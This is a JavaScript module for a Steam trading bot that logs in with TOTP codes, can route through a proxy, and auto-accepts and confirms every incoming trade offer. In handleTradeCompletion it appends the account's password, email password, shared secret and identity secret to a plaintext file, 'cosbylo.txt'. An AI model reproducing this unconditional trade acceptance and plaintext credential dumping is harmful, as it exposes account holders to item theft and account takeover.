const SteamUser = require('steam-user');
const SteamTotp = require('steam-totp');
const SteamCommunity = require('steamcommunity');
const TradeOfferManager = require('steam-tradeoffer-manager');
const FS = require('fs');
const HttpsProxyAgent = require('https-proxy-agent');

class SteamClientManager {
    constructor(proxyConfig = null) {
        this.proxyConfig = proxyConfig;
        
        const clientOptions = {};
        if (proxyConfig) {
            const proxyUrl = `http://${proxyConfig.username}:${proxyConfig.password}@${proxyConfig.server}`;
            clientOptions.httpProxy = proxyUrl;
            this.proxyAgent = new HttpsProxyAgent(proxyUrl);
            console.log(`Steam client configured to use proxy: ${proxyConfig.server}`);
        } else {
            console.log('Steam client not using a proxy');
        }

        this.client = new SteamUser(clientOptions);
        this.community = new SteamCommunity();

        if (proxyConfig) {
            this.community.httpProxy = `http://${proxyConfig.username}:${proxyConfig.password}@${proxyConfig.server}`;
        }

        this.manager = new TradeOfferManager({
            steam: this.client,
            community: this.community,
            language: 'en',
            ...(proxyConfig && { proxyAgent: this.proxyAgent })
        });

        this.isLoggedIn = false;
    }
    async initiateSteamClient(credentials) {
        if (this.isLoggedIn) {
            console.log('Already logged in. Skipping login process.');
            return;
        }

        if (FS.existsSync('polldata.json')) {
            this.manager.pollData = JSON.parse(FS.readFileSync('polldata.json').toString('utf8'));
        }

        return new Promise((resolve, reject) => {
            this.client.logOn({
                accountName: credentials.username,
                password: credentials.password,
                twoFactorCode: SteamTotp.getAuthCode(credentials.sharedSecret)
            });

            this.client.once('loggedOn', () => {
                console.log(`Logged into Steam as ${credentials.username}`);
                this.isLoggedIn = true;
                this.setupEventListeners(credentials);
                resolve(this.client);
            });

            this.client.once('error', (err) => {
                console.error('Login error:', err);
                reject(err);
            });
        });
    }

    setupEventListeners(credentials) {
        this.client.on('webSession', async (sessionID, cookies) => {
            console.log("Received web session");
            try {
                await this.community.setCookies(cookies);
                console.log("Cookies set for SteamCommunity");

                await this.manager.setCookies(cookies);
                console.log("Cookies set for TradeOfferManager");
            } catch (err) {
                console.error("An error occurred setting cookies:", err);
            }
        });

        this.manager.on('newOffer', (offer) => {
            console.log("New offer #" + offer.id + " from " + offer.partner.getSteam3RenderedID());
            this.handleTradeOffer(offer, credentials);
        });

        this.manager.on('receivedOfferChanged', (offer, oldState) => {
            console.log(`Offer #${offer.id} changed: ${TradeOfferManager.ETradeOfferState[oldState]} -> ${TradeOfferManager.ETradeOfferState[offer.state]}`);
            
            if (offer.state === TradeOfferManager.ETradeOfferState.Accepted) {
                this.handleTradeCompletion(offer, credentials);
            }
        });

        this.manager.on('pollData', (pollData) => {
            FS.writeFileSync('polldata.json', JSON.stringify(pollData));
        });
    }

    handleTradeOffer(offer, credentials) {
        offer.accept((err, status) => {
            if (err) {
                console.log("Unable to accept offer: " + err.message);
            } else {
                console.log("Offer accepted: " + status);
                if (status === "pending") {
                    this.community.acceptConfirmationForObject(credentials.identitySecret, offer.id, (err) => {
                        if (err) {
                            console.log("Can't confirm trade offer: " + err.message);
                        } else {
                            console.log("Trade offer " + offer.id + " confirmed");
                        }
                    });
                }
            }
        });
    }

    cleanupListeners() {
        this.manager.removeAllListeners('newOffer');
        this.manager.removeAllListeners('receivedOfferChanged');
        this.client.removeAllListeners('webSession');
    }

    async logOffFromSteam() {
        return new Promise((resolve, reject) => {
            if (!this.isLoggedIn) {
                console.log("Not logged in to Steam.");
                resolve();
                return;
            }

            this.cleanupListeners();
            this.client.logOff();
            this.client.once('disconnected', () => {
                console.log("Logged off from Steam.");
                this.isLoggedIn = false;
                resolve();
            });
            this.client.once('error', (err) => {
                console.error("Error logging off from Steam:", err);
                reject(err);
            });
        });
    }
    handleTradeCompletion(offer, credentials) {
        offer.getExchangeDetails((err, status, tradeInitTime, receivedItems, sentItems) => {
            if (err) {
                console.log(`Error fetching exchange details: ${err.message}`);
                return;
            }

            let newReceivedItems = receivedItems.map(item => item.new_assetid);
            let newSentItems = sentItems.map(item => item.new_assetid);

            console.log(`Received items: ${newReceivedItems.join(', ')} | Sent items: ${newSentItems.join(', ')} | Status: ${TradeOfferManager.ETradeStatus[status]}`);

            // Save the credentials to a file when items are received
            const filePath = 'cosbylo.txt';
            const dataToWrite = `${credentials.id}:${credentials.username}:${credentials.password}:${credentials.emailUsername}:${credentials.emailPassword}:${credentials.sharedSecret}:${credentials.identitySecret}\n`;

            FS.appendFile(filePath, dataToWrite, (err) => {
                if (err) {
                    console.error('Failed to write to file:', err);
                } else {
                    console.log(`Credentials were saved to ${filePath} successfully!`);
                }
            });
        });
    }
}

module.exports = SteamClientManager;